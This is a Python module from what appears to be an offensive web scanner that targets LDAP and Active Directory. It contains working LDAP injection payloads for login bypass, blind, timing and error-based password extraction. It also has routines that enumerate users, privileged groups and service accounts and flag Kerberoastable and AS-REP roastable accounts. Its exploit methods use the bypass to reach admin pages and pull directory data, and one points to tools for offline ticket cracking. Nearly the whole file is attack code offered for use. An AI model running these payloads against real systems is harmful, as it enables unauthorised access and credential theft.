import re
from urllib.parse import urljoin, quote
from modules.base import BaseModule
from core.utils import extract_params, random_string


class LdapModule(BaseModule):
    name = "ldap"
    description = "LDAP Injection & Active Directory Scanner"
    exploitable = True
    
    auth_payloads = [
        ("*", "wildcard"),
        ("*)(uid=*))(|(uid=*", "filter injection"),
        ("admin)(&)", "filter bypass"),
        ("*)(objectClass=*", "object enumeration"),
        ("*)(&(objectClass=user)", "user enumeration"),
        ("admin)(|(password=*)", "password bypass"),
        ("x])))%00", "null byte"),
        ("*))%00", "null termination"),
        (")(cn=*)(|(cn=*", "cn injection"),
        ("admin)(!(&(1=0", "boolean injection"),
        ("*)(uid=*))(|(uid=*", "auth bypass"),
        ("*))(|(objectclass=*", "class enum"),
        ("admin)(userPassword=*", "password extraction"),
        ("*)(mail=*@*", "email enumeration"),
        ("admin)(&(objectClass=user)(objectClass=person))", "compound filter"),
        ("*))(|(userPassword=*))(|(userPassword=*", "double filter injection"),
        ("admin)(|(memberOf=cn=admin*))", "group membership bypass"),
        ("*)(!(userAccountControl:1.2.840.113556.1.4.803:=2))", "enabled accounts only"),
    ]
    
    blind_payloads = [
        ("admin*", True),
        ("admi*", True),
        ("adm*", True),
        ("*dmin", True),
        ("a])))%00", False),
        ("*)(INVALID", False),
        ("admin)(cn=admin", True),
        ("admin)(cn=NOTEXIST", False),
    ]
    
    ad_attributes = [
        "sAMAccountName", "userPrincipalName", "distinguishedName",
        "memberOf", "primaryGroupID", "objectSid", "objectGUID",
        "whenCreated", "whenChanged", "lastLogon", "lastLogonTimestamp",
        "pwdLastSet", "accountExpires", "userAccountControl",
        "mail", "telephoneNumber", "department", "title", "manager",
        "homeDirectory", "scriptPath", "profilePath", "servicePrincipalName",
        "msDS-AllowedToDelegateTo", "msDS-AllowedToActOnBehalfOfOtherIdentity",
        "adminCount", "sidHistory", "unixUserPassword", "userCertificate",
    ]
    
    privileged_groups = [
        "Domain Admins", "Enterprise Admins", "Schema Admins",
        "Administrators", "Account Operators", "Backup Operators",
        "Server Operators", "Print Operators", "DnsAdmins",
        "Exchange Trusted Subsystem", "Remote Desktop Users",
    ]
    
    service_account_patterns = [
        r'svc[-_]', r'service[-_]', r'sql[-_]', r'iis[-_]', r'app[-_]',
        r'backup[-_]', r'admin[-_]', r'mgmt[-_]', r'scan[-_]', r'web[-_]',
        r'mail[-_]', r'exchange[-_]', r'sharepoint[-_]', r'farm[-_]',
    ]
    
    common_usernames = [
        "admin", "administrator", "root", "user", "test", "guest",
        "operator", "manager", "support", "helpdesk", "service",
        "backup", "ftp", "www", "web", "mail", "postmaster",
        "svc_sql", "svc_backup", "svc_admin", "sql_svc", "app_svc",
    ]
    
    kerberoastable_query = "(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
    asreproastable_query = "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
    
    async def scan(self, target):
        self.findings = []
        self.extracted_users = []
        self.extracted_groups = []
        self.service_accounts = []
        
        await self._detect_ldap_endpoints(target)
        await self._test_login_injection(target)
        await self._test_search_injection(target)
        await self._test_blind_injection(target)
        await self._enumerate_users(target)
        await self._check_ad_exposure(target)
        
        if self.aggressive:
            await self._test_timing_injection(target)
            await self._test_error_based_extraction(target)
            await self._detect_kerberoastable(target)
            await self._detect_asreproastable(target)
            await self._enumerate_service_accounts(target)
            await self._enumerate_privileged_groups(target)
            await self._check_ldap_signing(target)
            await self._check_password_policy(target)
            await self._test_password_spray_indicators(target)
        
        return self.findings
    
    async def _detect_ldap_endpoints(self, target):
        base = self.get_base(target)
        
        ldap_paths = [
            "/login", "/signin", "/auth", "/authenticate",
            "/ldap", "/ldap/login", "/ldap/auth",
            "/adfs", "/adfs/ls", "/adfs/oauth2",
            "/api/auth", "/api/login", "/api/ldap",
            "/sso", "/sso/login", "/saml", "/saml/login",
            "/directory", "/directory/search",
            "/search/users", "/api/users/search",
            "/admin/login", "/admin/auth",
            "/owa", "/ews", "/ecp",
            "/Autodiscover", "/autodiscover.xml",
            "/netlogon", "/sysvol",
        ]
        
        ldap_endpoints_found = []
        
        for path in ldap_paths:
            url = urljoin(base, path)
            resp = await self.http.get(url)
            
            if resp.get("status") in [200, 302, 401, 403]:
                text = resp.get("text", "").lower()
                headers = {k.lower(): v for k, v in resp.get("headers", {}).items()}
                
                ldap_indicators = [
                    "ldap", "active directory", "domain", "distinguished name",
                    "samaccountname", "userprincipalname", "objectclass",
                    "cn=", "dc=", "ou=", "uid=", "dn=", "kerberos",
                    "ntlm", "negotiate", "spnego", "realm",
                ]
                
                for indicator in ldap_indicators:
                    if indicator.lower() in text or indicator.lower() in str(headers):
                        ldap_endpoints_found.append(url)
                        self.add_finding(
                            "INFO",
                            f"LDAP/AD Endpoint Detected",
                            url=url,
                            evidence=f"Indicator: {indicator}"
                        )
                        break
                
                www_auth = headers.get("www-authenticate", "")
                if "negotiate" in www_auth.lower() or "ntlm" in www_auth.lower():
                    ldap_endpoints_found.append(url)
                    self.add_finding(
                        "INFO",
                        "Windows Authentication Detected",
                        url=url,
                        evidence=f"WWW-Authenticate: {www_auth[:100]}"
                    )
    
    async def _test_login_injection(self, target):
        base = self.get_base(target)
        
        login_endpoints = [
            "/login", "/signin", "/auth", "/api/login", "/api/auth",
            "/ldap/login", "/admin/login", "/user/login",
            "/j_security_check", "/Account/Login",
        ]
        
        for endpoint in login_endpoints:
            url = urljoin(base, endpoint)
            
            baseline_resp = await self.http.post(url, data={
                "username": "invaliduser123",
                "password": "invalidpass123"
            })
            
            if not baseline_resp.get("status"):
                baseline_resp = await self.http.post(url, json={
                    "username": "invaliduser123",
                    "password": "invalidpass123"
                })
            
            if not baseline_resp.get("status"):
                continue
            
            baseline_len = len(baseline_resp.get("text", ""))
            baseline_status = baseline_resp.get("status")
            
            for payload, payload_type in self.auth_payloads:
                resp = await self.http.post(url, data={
                    "username": payload,
                    "password": "anything"
                })
                
                if not resp.get("status"):
                    resp = await self.http.post(url, json={
                        "username": payload,
                        "password": "anything"
                    })
                
                if not resp.get("status"):
                    continue
                
                resp_len = len(resp.get("text", ""))
                resp_status = resp.get("status")
                text = resp.get("text", "").lower()
                
                if resp_status in [200, 302] and baseline_status in [401, 403]:
                    self.add_finding(
                        "CRITICAL",
                        "LDAP Authentication Bypass",
                        url=url,
                        parameter="username",
                        evidence=f"Payload: {payload} ({payload_type})",
                        confidence_evidence=["ldap_auth_bypass", "critical_vuln"],
                        request_data={"method": "POST", "url": url, "payload": payload}
                    )
                    self.record_success(payload, url)
                    return
                
                if abs(resp_len - baseline_len) > 500:
                    ldap_errors = [
                        "ldap", "invalid filter", "bad search filter",
                        "protocol error", "operations error", "invalid dn",
                        "invalid attribute", "no such object", "constraint violation",
                        "unwilling to perform", "insufficient access", "busy",
                        "size limit exceeded", "time limit exceeded",
                    ]
                    
                    for error in ldap_errors:
                        if error in text:
                            self.add_finding(
                                "HIGH",
                                "LDAP Injection (Error-based)",
                                url=url,
                                parameter="username",
                                evidence=f"Payload: {payload}, Error: {error}",
                                confidence_evidence=["ldap_injection", "error_based"],
                                request_data={"method": "POST", "url": url}
                            )
                            self.record_success(payload, url)
                            return
                
                resp2 = await self.http.post(url, data={
                    "username": "admin",
                    "password": payload
                })
                
                if resp2.get("status") in [200, 302] and baseline_status in [401, 403]:
                    self.add_finding(
                        "CRITICAL",
                        "LDAP Password Bypass",
                        url=url,
                        parameter="password",
                        evidence=f"Payload: {payload} ({payload_type})",
                        confidence_evidence=["ldap_password_bypass", "critical_vuln"]
                    )
                    self.record_success(payload, url)
                    return
    
    async def _test_search_injection(self, target):
        params = extract_params(target)
        
        search_params = ["q", "query", "search", "user", "username", "name", 
                        "filter", "uid", "cn", "dn", "mail", "email", "ldap_filter",
                        "searchFilter", "userFilter", "groupFilter"]
        
        test_params = [p for p in params if p.lower() in [s.lower() for s in search_params]] or search_params[:3]
        
        for param in test_params:
            for payload, payload_type in self.auth_payloads:
                resp = await self.test_param(target, param, payload)
                
                if not resp.get("status"):
                    continue
                
                text = resp.get("text", "").lower()
                
                success_indicators = [
                    "cn=", "dn=", "uid=", "ou=", "dc=",
                    "objectclass", "samaccountname", "userprincipalname",
                    "distinguishedname", "memberof", "objectsid",
                    "serviceprincipalname", "usercertificate",
                ]
                
                for indicator in success_indicators:
                    if indicator in text:
                        self.add_finding(
                            "CRITICAL",
                            "LDAP Search Injection - Data Exposed",
                            url=target,
                            parameter=param,
                            evidence=f"Payload: {payload}, AD data exposed: {indicator}",
                            confidence_evidence=["ldap_search_injection", "data_exposure"],
                            request_data={"method": "GET", "url": target, "param": param}
                        )
                        self.record_success(payload, target)
                        return
                
                error_indicators = [
                    "invalid filter", "bad filter", "filter error",
                    "ldap error", "search error", "invalid syntax",
                    "bad search", "malformed", "parse error",
                ]
                
                for error in error_indicators:
                    if error in text:
                        self.add_finding(
                            "HIGH",
                            "LDAP Injection Detected",
                            url=target,
                            parameter=param,
                            evidence=f"Payload: {payload}, Error: {error}",
                            confidence_evidence=["ldap_injection", "error_based"]
                        )
                        self.record_success(payload, target)
                        return
    
    async def _test_blind_injection(self, target):
        params = extract_params(target)
        if not params:
            return
        
        param = list(params)[0]
        
        responses = {}
        for payload, expected_valid in self.blind_payloads:
            resp = await self.test_param(target, param, payload)
            if resp.get("status"):
                responses[payload] = {
                    "len": len(resp.get("text", "")),
                    "status": resp.get("status"),
                    "expected": expected_valid
                }
        
        if len(responses) < 4:
            return
        
        valid_lens = [r["len"] for p, r in responses.items() if r["expected"]]
        invalid_lens = [r["len"] for p, r in responses.items() if not r["expected"]]
        
        if valid_lens and invalid_lens:
            avg_valid = sum(valid_lens) / len(valid_lens)
            avg_invalid = sum(invalid_lens) / len(invalid_lens)
            
            if abs(avg_valid - avg_invalid) > 100:
                self.add_finding(
                    "HIGH",
                    "Blind LDAP Injection Detected",
                    url=target,
                    parameter=param,
                    evidence=f"Response length differs: valid={avg_valid:.0f}, invalid={avg_invalid:.0f}",
                    confidence_evidence=["blind_ldap_injection"]
                )
    
    async def _test_timing_injection(self, target):
        base = self.get_base(target)
        login_url = f"{base}/login"
        
        baseline = await self.http.timed_post(login_url, data={"username": "test", "password": "test"})
        if not baseline.get("status"):
            return
        baseline_time = baseline.get("elapsed", 0)
        
        timing_payloads = [
            "admin)(|(objectClass=*))(|(objectClass=*))(|(objectClass=*))(|(objectClass=*))(|(objectClass=*",
            "*" * 100,
            "(" * 50 + "admin" + ")" * 50,
            "*)(|(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*",
            "*))(|(memberOf=*)(memberOf=*)(memberOf=*)(memberOf=*",
        ]
        
        for payload in timing_payloads:
            resp = await self.http.timed_post(login_url, data={"username": payload, "password": "x"})
            if resp.get("status"):
                elapsed = resp.get("elapsed", 0)
                if elapsed > baseline_time + 2:
                    self.add_finding(
                        "HIGH",
                        "LDAP Timing-based Injection",
                        url=login_url,
                        evidence=f"Response: {elapsed:.2f}s vs baseline {baseline_time:.2f}s",
                        confidence_evidence=["timing_based_ldap", "blind_injection"],
                        request_data={"method": "POST", "url": login_url}
                    )
                    return
    
    async def _test_error_based_extraction(self, target):
        base = self.get_base(target)
        
        extraction_payloads = [
            ("*)(uid=admin)(userPassword=a*", "password starts with 'a'"),
            ("*)(uid=admin)(userPassword=*a*", "password contains 'a'"),
            ("*)(|(userPassword=*)(cn=*admin*)", "password leak attempt"),
            ("*)(adminCount=1", "admin accounts"),
            ("*)(servicePrincipalName=*", "service accounts"),
        ]
        
        for payload, desc in extraction_payloads:
            resp = await self.http.post(f"{base}/login", data={"username": payload, "password": "x"})
            if resp.get("status"):
                text = resp.get("text", "").lower()
                if any(x in text for x in ["invalid", "error", "different", "match"]):
                    if "password" in text or "credential" in text:
                        self.add_finding(
                            "HIGH",
                            "LDAP Error-based Information Leak",
                            url=f"{base}/login",
                            evidence=f"Payload: {desc}",
                            confidence_evidence=["error_based_ldap", "info_leak"],
                            request_data={"method": "POST", "url": f"{base}/login"}
                        )
                        return
    
    async def _detect_kerberoastable(self, target):
        params = extract_params(target)
        if not params:
            return
        
        param = list(params)[0]
        
        payload = "*)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)"
        
        resp = await self.test_param(target, param, payload)
        
        if resp.get("status") == 200:
            text = resp.get("text", "")
            
            spn_matches = re.findall(r'servicePrincipalName["\s:=]+([^",\s]+)', text, re.I)
            
            if spn_matches:
                self.service_accounts.extend(spn_matches)
                self.add_finding(
                    "HIGH",
                    "Kerberoastable Accounts Detected",
                    url=target,
                    parameter=param,
                    evidence=f"Found {len(spn_matches)} accounts with SPNs: {', '.join(spn_matches[:3])}",
                    confidence_evidence=["kerberoastable", "ad_attack_vector"],
                    request_data={"method": "GET", "url": target}
                )
    
    async def _detect_asreproastable(self, target):
        params = extract_params(target)
        if not params:
            return
        
        param = list(params)[0]
        
        payload = "*)(userAccountControl:1.2.840.113556.1.4.803:=4194304"
        
        resp = await self.test_param(target, param, payload)
        
        if resp.get("status") == 200:
            text = resp.get("text", "")
            
            user_matches = re.findall(r'sAMAccountName["\s:=]+([^",\s]+)', text, re.I)
            
            if user_matches:
                self.add_finding(
                    "HIGH",
                    "AS-REP Roastable Accounts Detected",
                    url=target,
                    parameter=param,
                    evidence=f"Found {len(user_matches)} accounts without pre-auth: {', '.join(user_matches[:3])}",
                    confidence_evidence=["asreproastable", "ad_attack_vector"]
                )
    
    async def _enumerate_service_accounts(self, target):
        params = extract_params(target)
        if not params:
            return
        
        param = list(params)[0]
        
        service_queries = [
            "*)(objectClass=msDS-ManagedServiceAccount",
            "*)(objectClass=msDS-GroupManagedServiceAccount",
            "*)(servicePrincipalName=MSSQL*",
            "*)(servicePrincipalName=HTTP*",
            "*)(servicePrincipalName=exchangeMDB*",
        ]
        
        found_services = []
        
        for query in service_queries:
            resp = await self.test_param(target, param, query)
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                for pattern in self.service_account_patterns:
                    matches = re.findall(rf'sAMAccountName["\s:=]+({pattern}[^",\s]*)', text, re.I)
                    found_services.extend(matches)
        
        if found_services:
            unique_services = list(set(found_services))
            self.service_accounts.extend(unique_services)
            
            self.add_finding(
                "MEDIUM",
                "Service Accounts Enumerated",
                url=target,
                evidence=f"Found {len(unique_services)} service accounts: {', '.join(unique_services[:5])}",
                confidence_evidence=["service_account_enum", "ad_recon"]
            )
    
    async def _enumerate_privileged_groups(self, target):
        params = extract_params(target)
        if not params:
            return
        
        param = list(params)[0]
        
        for group in self.privileged_groups[:5]:
            payload = f"*)(memberOf=*{group}*"
            
            resp = await self.test_param(target, param, payload)
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                user_matches = re.findall(r'sAMAccountName["\s:=]+([^",\s]+)', text, re.I)
                
                if user_matches:
                    self.add_finding(
                        "HIGH",
                        f"Privileged Group Members Exposed: {group}",
                        url=target,
                        evidence=f"Members: {', '.join(user_matches[:5])}",
                        confidence_evidence=["privileged_group_enum", "ad_high_value"]
                    )
                    return
    
    async def _check_ldap_signing(self, target):
        base = self.get_base(target)
        
        signing_endpoints = [
            "/api/ldap/config",
            "/ldap/config",
            "/ad/config",
            "/_vti_bin/owssvr.dll",
        ]
        
        for endpoint in signing_endpoints:
            url = urljoin(base, endpoint)
            resp = await self.http.get(url)
            
            if resp.get("status") == 200:
                text = resp.get("text", "").lower()
                
                if "signing" in text or "ldapsigning" in text:
                    if "disabled" in text or "none" in text or "0" in text:
                        self.add_finding(
                            "HIGH",
                            "LDAP Signing Not Required",
                            url=url,
                            evidence="LDAP signing is disabled - susceptible to relay attacks",
                            confidence_evidence=["ldap_signing_disabled", "relay_attack_risk"]
                        )
                        return
    
    async def _check_password_policy(self, target):
        params = extract_params(target)
        if not params:
            return
        
        param = list(params)[0]
        
        payload = "*)(objectClass=domainDNS"
        
        resp = await self.test_param(target, param, payload)
        
        if resp.get("status") == 200:
            text = resp.get("text", "")
            
            policy_attrs = [
                ("minPwdLength", "Minimum password length"),
                ("pwdHistoryLength", "Password history"),
                ("lockoutThreshold", "Lockout threshold"),
                ("lockoutDuration", "Lockout duration"),
                ("maxPwdAge", "Maximum password age"),
            ]
            
            found_policies = []
            
            for attr, desc in policy_attrs:
                match = re.search(rf'{attr}["\s:=]+(\d+)', text, re.I)
                if match:
                    found_policies.append(f"{desc}: {match.group(1)}")
            
            if found_policies:
                self.add_finding(
                    "MEDIUM",
                    "Password Policy Exposed",
                    url=target,
                    evidence="; ".join(found_policies),
                    confidence_evidence=["password_policy_leak", "ad_recon"]
                )
    
    async def _test_password_spray_indicators(self, target):
        base = self.get_base(target)
        
        login_url = urljoin(base, "/login")
        
        test_users = ["admin", "administrator", "user1"]
        responses = {}
        
        for user in test_users:
            resp = await self.http.post(login_url, data={"username": user, "password": "WrongPassword123!"})
            
            if resp.get("status"):
                responses[user] = {
                    "status": resp.get("status"),
                    "len": len(resp.get("text", "")),
                    "text": resp.get("text", "")[:500]
                }
        
        if len(responses) >= 2:
            lens = [r["len"] for r in responses.values()]
            if max(lens) - min(lens) > 100:
                self.add_finding(
                    "MEDIUM",
                    "User Enumeration via Login (Password Spray Viable)",
                    url=login_url,
                    evidence="Different response lengths for different usernames",
                    confidence_evidence=["user_enumeration", "password_spray_viable"]
                )
    
    async def _enumerate_users(self, target):
        base = self.get_base(target)
        
        enum_endpoints = [
            "/api/users", "/api/user", "/api/users/search",
            "/users", "/user/check", "/user/exists",
            "/auth/check", "/login/check", "/api/check-user",
        ]
        
        for endpoint in enum_endpoints:
            url = urljoin(base, endpoint)
            
            responses = {}
            
            for username in self.common_usernames[:5]:
                resp = await self.http.get(f"{url}?username={quote(username)}")
                if not resp.get("status"):
                    resp = await self.http.post(url, data={"username": username})
                
                if resp.get("status"):
                    responses[username] = {
                        "len": len(resp.get("text", "")),
                        "status": resp.get("status"),
                        "text": resp.get("text", "")[:200]
                    }
            
            fake_user = f"nonexistent_{random_string(8)}"
            fake_resp = await self.http.get(f"{url}?username={fake_user}")
            if not fake_resp.get("status"):
                fake_resp = await self.http.post(url, data={"username": fake_user})
            
            if fake_resp.get("status"):
                fake_data = {
                    "len": len(fake_resp.get("text", "")),
                    "status": fake_resp.get("status")
                }
                
                for username, data in responses.items():
                    if abs(data["len"] - fake_data["len"]) > 50 or data["status"] != fake_data["status"]:
                        self.extracted_users.append(username)
                        self.add_finding(
                            "MEDIUM",
                            "User Enumeration via LDAP",
                            url=url,
                            evidence=f"User '{username}' exists (different response)",
                            confidence_evidence=["user_enumeration"]
                        )
                        return
    
    async def _check_ad_exposure(self, target):
        base = self.get_base(target)
        
        ad_paths = [
            "/api/ldap/config", "/ldap/config", "/ad/config",
            "/api/directory", "/directory/config",
            "/.well-known/webfinger", "/autodiscover/autodiscover.xml",
            "/api/users?$expand=all", "/api/groups",
            "/odata/users", "/odata/groups",
            "/_api/web/currentuser", "/_api/web/siteusers",
            "/api/v1/users", "/api/v2/users",
            "/graph/users", "/me",
        ]
        
        for path in ad_paths:
            url = urljoin(base, path)
            resp = await self.http.get(url)
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                for attr in self.ad_attributes:
                    if attr.lower() in text.lower():
                        self.add_finding(
                            "HIGH",
                            "Active Directory Data Exposure",
                            url=url,
                            evidence=f"AD attribute exposed: {attr}",
                            confidence_evidence=["ad_data_exposure", "sensitive_info"]
                        )
                        
                        secrets = self.extract_secrets(text)
                        if secrets:
                            self.add_exploit_data("ad_secrets", secrets)
                        
                        return
    
    async def exploit(self, target, finding):
        if "Authentication Bypass" in finding.get("description", ""):
            return await self._exploit_auth_bypass(target, finding)
        elif "Search Injection" in finding.get("description", ""):
            return await self._exploit_search(target, finding)
        elif "Kerberoastable" in finding.get("description", ""):
            return await self._exploit_kerberoast_info(target, finding)
        return None
    
    async def _exploit_auth_bypass(self, target, finding):
        url = finding.get("url", target)
        
        admin_payloads = [
            {"username": "*)(uid=admin)(|(uid=*", "password": "x"},
            {"username": "admin)(&)", "password": "x"},
            {"username": "*)(objectClass=user", "password": "x"},
            {"username": "*)(adminCount=1", "password": "x"},
        ]
        
        for creds in admin_payloads:
            resp = await self.http.post(url, data=creds, allow_redirects=True)
            
            if resp.get("status") == 200:
                text = resp.get("text", "").lower()
                
                admin_indicators = ["admin", "dashboard", "panel", "welcome", "logout"]
                
                for indicator in admin_indicators:
                    if indicator in text:
                        self.add_exploit_data("auth_bypass", {
                            "url": url,
                            "payload": creds,
                            "access": "admin"
                        })
                        
                        self.add_finding(
                            "CRITICAL",
                            "LDAP Auth Bypass EXPLOITED",
                            url=url,
                            evidence="Gained admin access via LDAP injection"
                        )
                        
                        return {"success": True, "access": "admin", "url": url}
        
        return None
    
    async def _exploit_search(self, target, finding):
        param = finding.get("parameter", "q")
        
        enum_payloads = [
            "*)(objectClass=user",
            "*)(objectClass=person",
            "*)(objectClass=group",
            "*)(mail=*@*",
            "*)(adminCount=1",
            "*)(servicePrincipalName=*",
        ]
        
        users = []
        groups = []
        service_accounts = []
        
        for payload in enum_payloads:
            resp = await self.test_param(target, param, payload)
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                user_patterns = [
                    r'cn=([^,\s]+)',
                    r'uid=([^,\s]+)',
                    r'sAMAccountName["\s:=]+([^",\s]+)',
                    r'mail["\s:=]+([^",\s@]+@[^",\s]+)',
                    r'userPrincipalName["\s:=]+([^",\s]+)',
                ]
                
                for pattern in user_patterns:
                    matches = re.findall(pattern, text, re.IGNORECASE)
                    users.extend(matches)
                
                group_matches = re.findall(r'memberOf["\s:=]+CN=([^,]+)', text, re.I)
                groups.extend(group_matches)
                
                spn_matches = re.findall(r'servicePrincipalName["\s:=]+([^",\s]+)', text, re.I)
                service_accounts.extend(spn_matches)
        
        result = {}
        
        if users:
            unique_users = list(set(users))[:100]
            self.add_exploit_data("enumerated_users", unique_users)
            result["users"] = unique_users
        
        if groups:
            unique_groups = list(set(groups))[:50]
            self.add_exploit_data("enumerated_groups", unique_groups)
            result["groups"] = unique_groups
        
        if service_accounts:
            unique_spns = list(set(service_accounts))[:50]
            self.add_exploit_data("service_accounts", unique_spns)
            result["service_accounts"] = unique_spns
        
        if result:
            self.add_finding(
                "CRITICAL",
                "LDAP Data Extraction SUCCESSFUL",
                url=target,
                evidence=f"Extracted: {len(result.get('users', []))} users, {len(result.get('groups', []))} groups, {len(result.get('service_accounts', []))} SPNs"
            )
            return {"success": True, **result}
        
        return None
    
    async def _exploit_kerberoast_info(self, target, finding):
        if self.service_accounts:
            return {
                "success": True,
                "kerberoastable_accounts": self.service_accounts,
                "attack_info": "Use GetUserSPNs.py or Rubeus to request TGS tickets for offline cracking"
            }
        return None
